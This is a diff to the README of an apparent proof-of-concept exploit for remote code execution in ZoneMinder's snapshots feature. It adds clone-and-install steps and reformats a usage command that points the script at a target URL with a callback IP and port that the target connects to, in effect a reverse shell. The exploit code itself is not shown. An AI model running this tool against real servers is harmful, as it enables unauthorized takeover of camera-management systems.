@@ -4,9 +4,18 @@ This is a script written in Python that allows the exploitation of the **Zonemin
 
 ## Usage
 
+Clone the repository to your machine and install the dependencies using **pip** (it is recommended to use **virtualenv** to create an environment to separate these installations from global installations)
+
+```bash
+git clone https://github.com/m3m0o/zoneminder-snapshots-rce-poc
+pip install -r requirements.txt
+```
+
 The script needs the **target URL** with the **Zoneminder's** root path (like **http://example.com/zm, http://example.com** or **http://example.com/zoneminder)**, the **IP** or **domain** for the target machine to connect and the **port** for the target machine to connect. Here's an example:
 
-```python3 main.py -u http://zoneminder.target:8000 -i 10.10.14.56 -p 443```
+```python
+python3 main.py -u http://zoneminder.target:8000 -i 10.10.14.56 -p 443
+```
 
 ![script-demo](https://iili.io/Ju3w7t9.gif)
 
